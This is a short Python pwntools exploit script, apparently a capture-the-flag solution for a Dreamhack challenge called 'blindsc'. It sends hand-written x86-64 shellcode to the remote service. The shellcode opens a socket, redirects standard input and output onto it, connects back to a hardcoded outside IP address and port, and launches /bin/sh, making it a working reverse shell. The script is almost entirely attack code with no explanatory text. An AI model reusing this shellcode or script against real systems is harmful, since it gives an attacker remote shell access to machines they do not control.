#!/usr/bin/python3

from pwn import *

exe = ELF("./blindsc")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
# def GDB():
    # if not args.REMOTE:
    #     gdb.attach(p, gdbscript='''
    #     b *main+615
    #     c
    #     ''')
    #     input()

if args.REMOTE:
    p = remote('host3.dreamhack.games', 15146)
else:
    p = process([exe.path])
# GDB()
shellcode = asm(
    '''
    mov rax, 0x29
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall
    mov r14, rax

    mov rdi, r14
    mov rsi, 2
    dup2:
        mov rax, 0x21
        syscall
        dec rsi
        jns dup2

    mov rax, 0x2a
    mov rdi, r14
    lea rsi, [rip + socket_address]
    mov rdx, 16
    syscall

    movabs rax, 29400045130965551
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall

    socket_address:
        .quad 0xF9658A12C5490002
        .quad 0
    ''', arch='amd64'
)
sa(b'Input shellcode: ', shellcode)


p.interactive()

